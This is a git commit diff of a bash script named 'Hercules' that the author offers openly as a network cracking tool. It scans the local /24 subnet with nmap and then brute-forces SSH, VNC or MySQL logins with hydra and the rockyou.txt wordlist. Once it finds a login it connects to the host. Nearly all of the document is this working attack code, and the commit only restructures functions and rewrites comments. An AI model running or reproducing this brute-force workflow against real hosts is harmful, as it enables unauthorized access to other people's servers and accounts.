00054df70d0a995aaabf436a833072c4a4b1d562
Will Segale <39059459+WilSegale@users.noreply.github.com>
2023-07-11 09:25:29 -0400

    script

--- linux/script.sh
+++ linux/script.sh
@@ -1,35 +1,32 @@
 #!/bin/bash
 
+# Root user
 root=0
 
-# gets the current time in a 12-hour format
+# Gets the current time in a 12-hour format
 CURRENT_TIME=$(date +"%I:%M:%S %p")
 
-# gets current date in mm/dd/yyyy format
+# Gets current date in mm/dd/yyyy format
 CURRENT_DATE=$(date +"%m/%d/%Y")
-
-#gets the type of OS
-OSTYPE=$(uname -s)
 
 if [[ "$OSTYPE" == "linux"* ]]; then
     clear
-
     if [[ $EUID -ne $root ]]; then
         # Error message if not running as root
         echo "ERROR:root:TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE" >> ERROR.LOG
         echo "TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE"
         exit
     else
-        chmod +x * 
+        chmod +x *
         sudo rm -rf hydra.restore
         clear
 
         wget -q --spider http://google.com
 
-        #if the user is connected to the internet it work as normal
+        # If the user is connected to the internet, it works as normal
         if [[ $? -eq 0 ]]; then
             echo
-        #else it says they are not connected to the internet and will tell them to connect to it
+        # Else, it notifies them that they are not connected to the internet and tells them to connect
         else
             # Error message if offline
             echo "ERROR:root:TIME:$CURRENT_TIME You are offline. Please connect to the internet. DATE:$CURRENT_DATE." >> ERROR.LOG
@@ -39,14 +36,17 @@ if [[ "$OSTYPE" == "linux"* ]]; then
 
         clear
 
+        #tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
         Hercules() {
-            # the logo of the program
+            # The logo of the program
             figlet -f slant "Hercules"
-            
-            echo "Type your own number to see what port you want to see"
-            read -p "Do you want SSH(22), VNC(5900), MySQL(3306). To see all, type (ALL): " service
-        
+
+            echo "Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL': "
+            read -p ">>> " service
+
             if [[ $service == "ALL" || $service == "all" ]]; then
+                # Tells the user that it can take up to an hour to complete the scanning process
+                echo "This can take up to 1 hour to complete."
                 # Scan the entire network and display open ports
                 sudo nmap -sS 192.168.1.1/24 --open
                 hydra -h
@@ -61,21 +61,25 @@ if [[ "$OSTYPE" == "linux"* ]]; then
         }
 
         RunHackingCommand() {
-            echo "To crack VNC(5900), don't type anything in the 'Input Username' function"
+            #break in the outputs of my code
+            echo 
+            #services to crack the network
+            echo "To crack VNC(5900), don't type anything in the 'Input Username' prompt"
             echo "To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
             read -p "Input Username: " user
             read -p "Input Hostname: " host
+        }
 
+        RunHackingCommandWithVNC() {
             if [[ $service == 5900 || $service == "VNC" ]]; then
-                #checks if the user has put anything in the 'Input Username' function and the hostname funciton-
-                #if not, it will prompt the user to enter the username and hostname
-                if [[ $user == "" && $host == "" ]]; then
+                # Checks if the user has put anything in the 'Input Username' function and the hostname function
+                # If not, it will prompt the user to enter the username and hostname
+                if [[ $user == "" && $host == "" || $host == "" ]]; then
                     # No service specified, re-prompt for input
                     echo "No service specified"
                     RunHackingCommand
-                
-                #if the user inputs something in the 'Input Username' function and the hostname funciton-
-                #it will conitue as normal
+                # If the user inputs something in the 'Input Username' function and the hostname function,
+                # it will continue as normal
                 else
                     # Crack VNC password
                     hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
@@ -83,48 +87,59 @@ if [[ "$OSTYPE" == "linux"* ]]; then
                     open vnc://$host
                     exit
                 fi
-            elif [[ $service == 22 || $service == "ssh" ]]; then
-                #checks if the user has put anything in the 'Input Username' function and the hostname funciton-
-                #if not, it will prompt the user to enter the username and hostname
-                if [[ $user == "" && $host == "" ]]; then
+            fi
+        }
+
+        RunHackingCommandWithSSH() {
+            if [[ $service == 22 || $service == "ssh" ]]; then
+                # Checks if the user has put anything in the 'Input Username' function and the hostname function
+                # If not, it will prompt the user to enter the username and hostname
+                if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                     # No service specified, re-prompt for input
                     echo "No service specified"
                     RunHackingCommand
-                #if the user inputs something in the 'Input Username' function and the hostname funciton-
-                #it will conitue as normal
-                else 
+                # If the user inputs something in the 'Input Username' function and the hostname function,
+                # it will continue as normal
+                else
                     # Crack SSH password
                     hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
                     echo "Connecting to $user@$host"
                     sleep 3
                     ssh $user@$host
                 fi
-            elif [[ $service == 3306 || $service == "mysql" ]]; then 
-                #checks if the user has put anything in the 'Input Username' function and the hostname funciton-
-                #if not, it will prompt the user to enter the username and hostname
-                if [[ $user == "" && $host == "" ]]; then
-                    # No service specified, re-prompt for input
-                    echo "No service specified"
-                    RunHackingCommand
-                #if the user inputs something in the 'Input Username' function and the hostname funciton-
-                #it will conitue as normal
-                else
-                    # Crack MySQL password
-                    hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host
-                    echo "Loading to MySQL server..."
-                    sleep 3
-                    mysql -u $user -p -A
-                fi
-            
-            
             fi
         }
 
-        Hercules #calls the Hercules function
-        RunHackingCommand #calls the RunHackingCommand function
+        RunHackingCommandWithMySQL() {
+            if [[ $service == 3306 || $service == "mysql" ]]; then
+                # Checks if the user has put anything in the 'Input Username' function and the hostname function
+                # If not, it will prompt the user to enter the username and hostname
+                if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
+                    # No service specified, re-prompt for input
+                    echo "No service specified"
+                    RunHackingCommand
+                # If the user inputs something in the 'Input Username' function and the hostname function,
+                # it will continue as normal
+                else
+                    # Crack MySQL password
+                    hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host
+                    echo "Loading MySQL server..."
+                    sleep 3
+                    mysql -u $user -p -A
+                fi
+            fi
+        }
 
+        Hercules # Calls the Hercules function
+
+        RunHackingCommand # Calls the RunHackingCommand function
+
+        RunHackingCommandWithVNC # Calls the RunHackingCommandWithVNC function
+
+        RunHackingCommandWithSSH # Calls the RunHackingCommandWithSSH function
+
+        RunHackingCommandWithMySQL # Calls the RunHackingCommandWithMySQL function
     fi
-
 else
     clear
     # Warning message for wrong OS
